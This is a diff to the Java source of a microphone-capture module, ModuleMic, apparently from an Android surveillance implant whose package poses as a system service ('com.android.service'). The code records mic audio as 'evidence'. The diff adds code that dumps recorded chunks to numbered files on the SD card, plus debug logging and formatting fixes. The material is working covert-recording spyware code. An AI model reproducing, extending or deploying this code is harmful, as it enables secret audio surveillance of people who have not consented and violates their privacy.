@@ -9,6 +9,7 @@
 
 package com.android.service.module;
 
+import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 
@@ -26,6 +27,8 @@ import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfModule;
 import com.android.service.evidence.EvidenceType;
+import com.android.service.file.AutoFile;
+import com.android.service.file.Path;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerCall;
 import com.android.service.util.Check;
@@ -184,6 +187,8 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		}
 	}
 
+	int index = 0;
+
 	private synchronized void saveRecorderEvidence() {
 
 		if (Cfg.DEBUG) {
@@ -193,6 +198,12 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		final byte[] chunk = getAvailable();
 
 		if (chunk != null && chunk.length > 0) {
+
+			if (Cfg.MICFILE) {
+				AutoFile file = new AutoFile("/mnt/sdcard/record." + index + ".amr");
+				index++;
+				file.write(chunk);				
+			}
 
 			int offset = 0;
 			if (Utils.equals(chunk, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
@@ -212,7 +223,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 
 		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "zero chunk ");//$NON-NLS-1$
+				Check.log(TAG + " zero chunk ");//$NON-NLS-1$
 			}
 			numFailures += 1;
 		}
@@ -227,6 +238,9 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 				}
 
 				final int available = is.available();
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (getAvailable): " + available);//$NON-NLS-1$
+				}
 				ret = new byte[available];
 				is.read(ret);
 			}
@@ -311,6 +325,14 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
 		recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
 		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+		
+		/*
+		 * recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+		 * recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+		 * recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+		 * recorder.setAudioEncodingBitRate(16);
+		 * recorder.setAudioSamplingRate(44100);
+		 */
 
 		recorder.setOutputFile(sender.getFileDescriptor());
 
@@ -377,10 +399,10 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 
 		recorder.setOnErrorListener(null);
 		recorder.setOnInfoListener(null);
-	
-		try{
+
+		try {
 			recorder.stop();
-		}catch(Exception ex){
+		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
 				Check.log(ex);
 			}
